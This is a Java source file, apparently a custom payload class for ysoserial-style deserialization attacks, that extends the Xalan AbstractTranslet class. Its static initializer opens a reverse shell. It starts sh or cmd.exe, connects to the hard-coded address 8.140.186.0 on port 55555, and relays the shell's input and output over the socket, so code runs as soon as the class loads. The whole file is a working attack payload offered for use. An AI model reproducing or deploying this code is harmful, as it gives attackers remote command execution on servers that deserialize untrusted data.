package ysoserial;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.*;
import java.net.Socket;

// Java反弹shell：https://gist.github.com/caseydunham/53eb8503efad39b83633961f12441af0
public class MyClassLoader2_3 extends AbstractTranslet {
    public static final String UNIX_SHELL = "sh";
    public static final String WINDOWS_SHELL = "cmd.exe";
    static {
        try{
            String host = "8.140.186.0"; // set your ip
            int port = 55555; //set any port you like
            String os = System.getProperty("os.name").toLowerCase();
	    String cmd;
	    if (os.startsWith("win")) {
	    	cmd= WINDOWS_SHELL;
	    } else {
	    	cmd= UNIX_SHELL;
	    }
            Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
            Socket s=new Socket(host,port);
            InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
            OutputStream po=p.getOutputStream(),so=s.getOutputStream();
            while(!s.isClosed()) {
                while(pi.available()>0)
                    so.write(pi.read());
                while(pe.available()>0)
                    so.write(pe.read());
                while(si.available()>0)
                    po.write(si.read());
                so.flush();
                po.flush();
                Thread.sleep(50);
                try {
                    p.exitValue();
                    break;
                }
                catch (Exception e){
                }
            };
            p.destroy();
            s.close();

        }catch(Exception e){
            e.printStackTrace();
        }
    }


    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}

